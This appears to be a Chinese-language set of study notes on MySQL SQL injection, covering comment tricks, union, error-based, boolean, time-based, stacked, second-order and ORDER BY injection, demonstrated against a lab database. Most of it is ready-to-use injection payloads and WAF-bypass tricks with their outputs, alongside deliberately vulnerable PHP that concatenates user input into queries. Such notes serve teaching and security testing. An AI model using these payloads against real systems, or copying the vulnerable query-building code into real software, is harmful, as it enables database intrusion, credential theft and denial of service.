# 注释

1. 行间注释

```
#xxx
-- xxx 注意有一个空格
`xxx
;%00
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091253252.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091255869.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091255286.png)

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$db = new mysqli("192.168.241.128", "root", "root", "mysql", "4700");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
$test =$_POST['test'];
$query = "select host,user from user where user = '$test';";
$result = $db->query($query);
if($db->error){
    echo "<br>".$db->error."<br>";
}
if ($result->num_rows !== 0) {
    var_dump($result->fetch_all());
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091303403.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091303600.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091303599.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091307478.png)

2. 行内注释

```
/*xxx*/
语句执行 /*!xxx*/
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091341314.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091342227.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091346194.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091349547.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202091350068.png)

如果在`!`字符后添加版本号,则只有当mysql版本大于或等于指定的版本号时才会执行注释中的语法

[https://dev.mysql.com/doc/refman/5.7/en/comments.html](https://dev.mysql.com/doc/refman/5.7/en/comments.html)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202092034319.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202092035787.png)

>`/*!`不需要完全闭合,利用这点可以绕过某些waf的限制

```
/*!select @@version*/
/*!select/*!@@version*/
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203011612543.png)

# 常用注入手段

## 联合查询注入

联合查询注入即在原有的查询语句中,通过`union`拼接传入的恶意语句,达到获取数据的目的(常用于有回显的情况)

正常查询语句`select column_name from table where xxx`

恶意查询语句`select column_name from table where xxx union select column_name (from table where xxx)`()可选

使用`union`进行拼接时,前后两个`select`语句所返回的字段数必须一致

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210003541.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210004035.png)

若仅回显一行数据则需要将部分`column_name`设置为空

## 报错注入

mysql在报错信息里可能会带有部分数据,利用这一特性进行注入,但要注意数据外带的长度限制

报错注入主要有以下几种

### 数据类型溢出

在mysql版本大于`5.5`时才会产生溢出报错

[https://dev.mysql.com/doc/refman/5.7/en/integer-types.html](https://dev.mysql.com/doc/refman/5.7/en/integer-types.html)

[https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html](https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html)

|Type|Storage (Bytes)|Minimum Value Signed|Minimum Value Unsigned|Maximum Value Signed|Maximum Value Unsigned|
|:---:|:---:|:---:|:---:|:---:|:---:|
|TINYINT|1|-128|0|127|255|
|SMALLINT|2|-32768|0|32767|65535|
|MEDIUMINT|3|-8388608|0|8388607|16777215|
|INT|4|-2147483648|0|2147483647|4294967295|
|BIGINT|8|-2^63|0|2^63-1|2^64-1|

`2^64-1=18446744073709551615`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211058286.png)

如果一个查询成功执行,则其返回值为0,因此可以利用该返回值进行数学运算

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211134646.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211135283.png)

但是整型溢出报错并带出数据只能在某些特定版本使用,在版本大于`5.5.48`时报错不能带出数据

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211449716.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211451073.png)

>`exp()`此函数返回e(自然对数的底)的x次方的值

>`pow()`指数运算

>`cot()`cotan

```
select exp(~(select*from(select @@version)x));
select pow(2,~(select*from(select @@version)x));
select cot(!(select*from(select @@version)x));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211510567.png)

```
select !atan((select*from(select @@version)x))-~0;
select !cos((select*from(select @@version)x))-~0;
select !ceil((select*from(select @@version)x))-~0;
select !floor((select*from(select @@version)x))-~0;
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211417654.png)

### 特殊的数学函数

几何对象函数

```
select multipoint((select*from(select*from(select @@version)x)y));
select geometrycollection((select*from(select*from(select @@version)x)y));
select polygon((select*from(select*from(select @@version)x)y));
select multipolygon((select*from(select*from(select @@version)x)y));
select linestring((select*from(select*from(select @@version)x)y));
select multilinestring((select*from(select*from(select @@version)x)y));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211426633.png)

空间函数

```
select ST_LongFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_LatFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_PointFromGeoHash((select*from(select*from(select @@version)x)y),1);
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211435901.png)

### xpath语法错误

`ExtractValue()`和`UpdateXML()`

`ExtractValue(xml_frag, xpath_expr)`

`UpdateXML(xml_target, xpath_expr, new_xml)`

第二个参数都要求符合xpath语法,如果不符合就会报错并带有数据,通过在前后添加`~`即`0x7e`使其不符合xpath格式从而报错

```
select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
select extractvalue(1,concat(0x7e,(select @@version),0x7e));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211521265.png)

### 重复数据报错

主键具有唯一性,主键重复则会报错

```
select * from table3;
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
```

`select count(*) from table3 group by info;`

首先建立一个空的虚拟表

|info(primary key)|count|
|:---:|:---:|
|||

从数据库中查询数据,检查虚拟表是否存在对应条目,不存在则插入新记录,存在则count字段加1

|info(primary key)|count|
|:---:|:---:|
|a|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|
|c|1|

|info(primary key)|count|
|:---:|:---:|
|a|2|
|b|1|
|c|2|

`rand()`不能接在`order by/group by`后面

[https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)

RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations

Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result

```
select floor(rand(0)*2) from `TABLES` limit 8;
+------------------+
| floor(rand(0)*2) |
+------------------+
| 0.0              |
| 1.0              |
| 1.0              |
| 0.0              |
| 1.0              |
| 1.0              |
| 0.0              |
| 0.0              |
+------------------+
```

`select count(*) from table3 group by floor(rand(0)*2);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212150136.png)

>`group by`只有在插入虚拟表时才会计算rand,更新时不会计算

首先,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表为空,进行插入操作,此时`floor(rand(0)*2)`结果为`1`

已执行两次`rand`计算

|primary key|count|
|:---:|:---:|
|1|1|

然后,`group by floor(rand(0)*2)`被执行确定为`group by 1`,此时虚拟表存在该项`count+1`

已执行三次`rand`计算

|primary key|count|
|:---:|:---:|
|1|2|

然后,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表不存在该项,进行插入操作,此时`floor(rand(0)*2)`结果为`1`,将要插入`1`但是此时虚拟表已存在`1`,因此主键冲突产生报错

已执行五次`rand`计算

因此表中需要有至少三条数据供`floor(rand(0)*2)`达到报错条件

```
select floor(rand(14)*2) from `TABLES` limit 4;
+-------------------+
| floor(rand(14)*2) |
+-------------------+
| 1.0               |
| 0.0               |
| 1.0               |
| 0.0               |
+-------------------+
```

>floor(rand(14)*2)产生随机序列1010...,因此表中可以只有两条数据

>如何利用该报错?

爆破库名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212218318.png)

爆破表名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212222673.png)

爆破列名

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212227064.png)

爆破字段

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select group_concat(id) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select mid(group_concat(info),1,100) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212338165.png)

```
select column_name,column_type from information_schema.columns where table_name='table3';
+-------------+--------------+
| column_name | column_type  |
+-------------+--------------+
| id          | int(11)      |
| info        | varchar(255) |
+-------------+--------------+
```

---

列名具有唯一性,列名重复则会报错,利用这一特性可以进行无列名注入

>例子

利用name_const来制造一个列,但参数需要是常量(The arguments should be constants)

[https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211544831.png)

>无列名注入

[MySQL JOIN 菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)

通过`join`可建立两个表之间的内连接,通过对要查询列名的表与其自身进行内连接,会产生的相同列名,从而发生错误带出数据(即列名)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211800660.png)

`using()`用于两张表之间的`join`连接查询,并且`using()`中的列在两张表中都存在,由此剔除掉前一次注入时得到的列名

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211803273.png)

```
select * from(select * from table1 as a join table1 as b)c;
select * from(select * from table1 as a join table1 as b using (id))c;
select * from(select * from table1 as a join table1 as b using (id,username))c;
```

### 调用不存在的函数可读取数据库名字

```
select misaka();
(1305, 'FUNCTION sql_injection_test.misaka does not exist')
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212343727.png)

### GTID函数

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242037203.png)

```
select gtid_subset(user(),1);
(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
select gtid_subtract(user(),1);
(1772, "Malformed GTID set specification 'root@172.18.0.1'.")
select gtid_subtract((select group_concat(id) from sql_injection_test.table1),1);
(1772, "Malformed GTID set specification '1,2,3,4'.")
select gtid_subtract((select group_concat(username) from sql_injection_test.table1),1);
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242045868.png)

```
select * from table1 where id='1' and gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
select * from table1 where id='1' or gtid_subtract((select group_concat(username) from sql_injection_test.table1),1)='1'#
(1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
```

### JSON函数

据说有版本限制,未进行验证(当前测试版本为`5.7.11`)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242106092.png)

```
select json_array_append(user(),null,null);
(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_array_append(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_array_append: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_array_insert(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_array_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_insert(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_insert: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_merge(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_merge: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_merge_patch(user(),1,2);
(1305, 'FUNCTION information_schema.json_merge_patch does not exist')
select json_remove(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_remove: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_replace(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_replace: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
select json_set(user(),1,2);
(3141, 'Invalid JSON text in argument 1 to function json_set: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
```

### UUID

版本限制(大于`8.0`)

[https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html](https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242124969.png)

```
select uuid_to_bin(user())
(1411, "Incorrect string value: 'root@192.168.241.1' for function uuid_to_bin")
select bin_to_uuid(user())
(1411, "Incorrect string value: 'root@192.168.241.1' for function bin_to_uuid")
```

## 布尔注入

服务器根据sql语句的执行结果返回`success`或者是`fail`,通过构造语句利用服务器的返回值来判断数据是否符合预期

`select * from user where username='$username'`

`select * from user where username='$username' or 1#`构造永真条件,无论输入的用户名是什么都会返回`success`

```
select * from table3 where id='1' and length(database())>1
+----+------+
| id | info |
+----+------+
| 1  | a    |
+----+------+
1 row in set
Time: 0.008s
select * from table3 where id='1' and length(database())<1
+----+------+
| id | info |
+----+------+
0 rows in set
Time: 0.011s
```

```
select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)<50
+----+------+
| id | info |
+----+------+
| 1  | a    |
+----+------+
1 row in set
Time: 0.008s
select * from table3 where id='1' and mid((select group_concat(info) from table3),1,1)>50
+----+------+
| id | info |
+----+------+
0 rows in set
Time: 0.010s
```

## 延时注入

构造延时注入语句,根据服务器响应时间判断数据是否符合预期,常用于盲注

1. sleep

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212353818.png)

`select * from table3 where id='1' and if (length(database())>5,sleep(5),1)#`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212355619.png)

`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,sleep(5),1)#`

裸sleep注入

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132128341.png)

实际使用

`' or sleep(ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>100)#`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132132924.png)

1. benchmark

`BENCHMARK(count,exp)`重复执行`count`次`exp`中的内容,其返回值为0

```
SELECT BENCHMARK(1000000,1+1);
+------------------------+
| BENCHMARK(1000000,1+1) |
+------------------------+
| 0                      |
+------------------------+
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201220004326.png)

`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,benchmark(10e7,1+1),1)#`

3. 笛卡尔积

可以大量消耗服务器资源

```
SELECT count(*) FROM information_schema.columns;
+----------+
| count(*) |
+----------+
| 3087     |
+----------+
1 row in set
Time: 0.030s
SELECT count(*) FROM information_schema.columns A,information_schema.columns B;
+----------+
| count(*) |
+----------+
| 9529569  |
+----------+
1 row in set
Time: 0.289s
SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
跑很久...
```

```
select * from table3 where id='-1' or if (length(database())<1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
5 rows in set
Time: 0.018s
select * from table3 where id='-1' or if (length(database())>1,(select count(*) from information_schema.columns a,information_schema.columns b),1)#
+----+------+
| id | info |
+----+------+
| 1  | a    |
| 2  | a    |
| 3  | b    |
| 4  | c    |
| 5  | c    |
+----+------+
5 rows in set
Time: 0.361s
```

4. get_lock

[https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html](https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html)

`GET_LOCK(str,timeout)`

尝试对`str`加锁,超时时间为`timeout`秒,负值`timeout`表示无限超时

在一个`session`中可以先锁定一个变量`select get_lock('misaka',1);`

然后通过另一个`session`再次执行get_lock函数`select get_lock('misaka',5);`此时会产生5秒的延迟，

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201221227308.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201222322928.png)

`select * from table3 where id='-1' or if (length(database())>1,(select get_lock('misaka',5)),1)#`

5. rpad/repeat

构造恶意的正则匹配去消耗服务器资源,从而达到延时注入的目的

[RPAD(str,len,padstr)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_rpad)

```
mysql> SELECT RPAD('hi',5,'?');
        -> 'hi???'
mysql> SELECT RPAD('hi',1,'?');
        -> 'h'
```

[REPEAT(str,count)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_repeat)

```
mysql> SELECT REPEAT('MySQL', 3);
        -> 'MySQLMySQLMySQL'
```

首先利用`repeat`或者`rpad`构造超长的待匹配字符串,然后再次利用这两个函数去构造正则匹配规则,利用匹配规则进行多次匹配(通过`repeat`中的数据量来控制延迟时间)

```
select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b');
+-------------------------------------------------------------+
| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b') |
+-------------------------------------------------------------+
| 0                                                           |
+-------------------------------------------------------------+
1 row in set
Time: 0.726s

select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b');
+-------------------------------------------------------------+
| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b') |
+-------------------------------------------------------------+
| 0                                                           |
+-------------------------------------------------------------+
1 row in set
Time: 3.869s
```

```
select * from table1 where id='1' or if(length(database())>1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
+----+----------+----------+-----------------+
1 row in set
Time: 3.297s
select * from table1 where id='1' or if(length(database())<1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
+----+----------+----------+-----------------+
1 row in set
Time: 0.009s
```

在某些情况下,`rpad`可作为`mid`和`substr`的替换

>`0x0`指代的是`\x00`

```
mysql root@localhost:sql_injection_test> select * from table1;
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 4  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select rpad((select group_concat(id) from table1),1,0x0)
+---------------------------------------------------+
| rpad((select group_concat(id) from table1),1,0x0) |
+---------------------------------------------------+
| 1                                                 |
+---------------------------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select rpad((select group_concat(id) from table1),2,0x0)
+---------------------------------------------------+
| rpad((select group_concat(id) from table1),2,0x0) |
+---------------------------------------------------+
| 1,                                                |
+---------------------------------------------------+
1 row in set
Time: 0.007s
mysql root@localhost:sql_injection_test> select rpad((select group_concat(id) from table1),8,0x0)
+---------------------------------------------------+
| rpad((select group_concat(id) from table1),8,0x0) |
+---------------------------------------------------+
| 1,2,3,4                                          |
+---------------------------------------------------+
1 row in set
Time: 0.007s
mysql root@localhost:sql_injection_test> select rpad((select group_concat(username) from table1),1,0x0)
+---------------------------------------------------------+
| rpad((select group_concat(username) from table1),1,0x0) |
+---------------------------------------------------------+
| a                                                       |
+---------------------------------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select rpad((select group_concat(username) from table1),10,0x0)
+----------------------------------------------------------+
| rpad((select group_concat(username) from table1),10,0x0) |
+----------------------------------------------------------+
| admin,tim,                                               |
+----------------------------------------------------------+
1 row in set
Time: 0.008s
```

## 堆叠注入

即多语句执行,例题可以参照sqli-labs的Less-38

PDO默认支持多语句查询,如果php版本小于5.5.21或者创建PDO实例时未设置`PDO::MYSQL_ATTR_MULTI_STATEMENTS`为`false`时可能会造成堆叠注入

```php
<?php
$dbms='mysql';
$host='172.17.0.1';
$port=4000;
$dbName='test';
$user='root';
$pass='root';
$dsn="$dbms:host=$host;port=$port;dbname=$dbName";
try {
    $pdo = new PDO($dsn, $user, $pass);
} catch (PDOException $e) {
    echo $e;
}
$sql = "select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA";
$stmt = $pdo->query($sql);
while($row=$stmt->fetch(PDO::FETCH_ASSOC))
{
    var_dump($row);
}
echo "<br>";


$id = $_GET['id'];
$sql = "SELECT * from users where id =".$id;
$stmt = $pdo->query($sql);
while($row=$stmt->fetch(PDO::FETCH_ASSOC))
{
    var_dump($row);
}
echo "<br>";

$sql = "select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA";
$stmt = $pdo->query($sql);
while($row=$stmt->fetch(PDO::FETCH_ASSOC))
{
    var_dump($row);
}
echo "<br>";
```

![](https://img.mi3aka.eu.org/2022/09/698fd7877db687c5839ed827c36bbefc.png)

![](https://img.mi3aka.eu.org/2022/09/acb6040c6785b39d93b70e075f1e060b.png)

## 二次注入

攻击者构造的恶意数据在数据库语句执行前进行了转义操作,但是服务器在从数据库中取出数据时没有进行相应的转义操作,导致了后续在进行语句拼接时产生的SQL注入问题

```php
public function add_user($username, $email, $password): bool
{
    $username = mysqli_real_escape_string($this->sql, $username);
    $email = mysqli_real_escape_string($this->sql, $email);
    $password = sha1($password);
    if ($this->check_user_exist($username)) {
        return false;
    }
    $sql_query = "INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL,'$username','$password')";
    $this->sql->query($sql_query);
    $sql_query = "INSERT INTO `email` (`id`, `username`, `email`, `time`) VALUES (NULL,'$username','$email',NOW())";
    $this->sql->query($sql_query);
    return true;
}
public function add_email($email)
{
    $id = $_SESSION['uid'];
    $sql_query = "SELECT username FROM users where id = '$id'";
    $row = mysqli_query($this->sql, $sql_query);
    $result = $row->fetch_all(MYSQLI_ASSOC);
    $username = $result[0]['username'];
    $email = mysqli_real_escape_string($this->sql, $email);
    $sql_query = "INSERT INTO `email` (`id`, `username`, `email`, `time`) VALUES (NULL,'$username','$email',NOW())";
    $this->sql->query($sql_query);
}
public function list_email()
{
    $id = $_SESSION['uid'];
    $sql_query = "SELECT username FROM users where id = '$id'";
    $row = mysqli_query($this->sql, $sql_query);
    $result = $row->fetch_all(MYSQLI_ASSOC);
    $username = $result[0]['username'];
    $sql_query = "SELECT email,time FROM email where username = '$username'";

    $row = mysqli_query($this->sql, $sql_query);
    $posi = 1;
    echo '<div class="container"><table class="table"><thead><tr><th scope="col">#</th><th scope="col">Email</th><th scope="col">Time</th></tr></thead><tbody>';
    while ($result = $row->fetch_assoc()) {
        echo '<tr><th scope="row">' . $posi++ . '</th><td>' . $result['email'] . '</td><td>' . $result['time'] . '</td></tr>';
    }
    echo '</tbody></table></div>';
}
```

可以看到`add_email`和`list_email`中所使用的`usernane`均来自数据库查询得到的结果,假设在注册时我们注册一个名为`' or 1#`的用户

在注册过程中,由于存在`mysqli_real_escape_string`,敏感字符会被转义后再执行sql语句,但是从数据库取出`username`后,并没有执行相应的`mysqli_real_escape_string`,因此`SELECT email,time FROM email where username = '$username'`会变成`SELECT email,time FROM email where username = '' or 1#'`因此造成了二次注入

# 注入技巧

## order by注入

`SELECT`语句使用`ORDER BY`子句将查询数据排序后再返回数据

1. 利用`rand`进行注入

`select * from users order by rand(0);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(%E5%B7%B2%E5%AE%8C%E6%88%90)/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-03%20095858.png)

`select * from users order by rand(1);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(%E5%B7%B2%E5%AE%8C%E6%88%90)/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-03%20095932.png)

可以看到由于`rand`结果的不同导致了排序结果的不同,利用这一点可以进行注入

例如`select * from users order by rand(length(database())=8);`可以根据回显数据排序的方式的不同来判断`database`名称的长度

`select * from users order by rand(ascii(substr((select group_concat(username) from users),1,1))<50);`二分法确定名字

>原理

```
mysql root@localhost:sql_injection_test> select id,rand(0) from table1;
+----+---------------------+
| id | rand(0)             |
+----+---------------------+
| 1  | 0.15522042769493574 |
| 2  | 0.620881741513388   |
| 3  | 0.6387474552157777  |
| 4  | 0.33109208227236947 |
+----+---------------------+
4 rows in set
Time: 0.010s
mysql root@localhost:sql_injection_test> select id,rand(0) from table1 order by rand(0);
+----+---------------------+
| id | rand(0)             |
+----+---------------------+
| 1  | 0.15522042769493574 |
| 4  | 0.33109208227236947 |
| 2  | 0.620881741513388   |
| 3  | 0.6387474552157777  |
+----+---------------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by rand(0);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 1  | admin    | admin!@# | admin@admin.org |
| 4  | mike     | asdfqwer | mike@gmail.com  |
| 2  | tim      | 123456   | tim@qq.com      |
| 3  | mike     | asdfqwer | mike@gmail.com  |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
```

```
mysql root@localhost:sql_injection_test> select id,rand(1) from table1;
+----+---------------------+
| id | rand(1)             |
+----+---------------------+
| 1  | 0.40540353712197724 |
| 2  | 0.8716141803857071  |
| 3  | 0.1418603212962489  |
| 4  | 0.09445909605776807 |
+----+---------------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select id,rand(1) from table1 order by rand(1);
+----+---------------------+
| id | rand(1)             |
+----+---------------------+
| 4  | 0.09445909605776807 |
| 3  | 0.1418603212962489  |
| 1  | 0.40540353712197724 |
| 2  | 0.8716141803857071  |
+----+---------------------+
4 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 order by rand(1);
+----+----------+----------+-----------------+
| id | username | password | email           |
+----+----------+----------+-----------------+
| 4  | mike     | asdfqwer | mike@gmail.com  |
| 3  | mike     | asdfqwer | mike@gmail.com  |
| 1  | admin    | admin!@# | admin@admin.org |
| 2  | tim      | 123456   | tim@qq.com      |
+----+----------+----------+-----------------+
4 rows in set
Time: 0.008s
```

2. 利用`if`进行延时注入

`select * from users order by (if(ascii(substr((select group_concat(username) from users),1,1))>100,1,sleep(0.1)));`

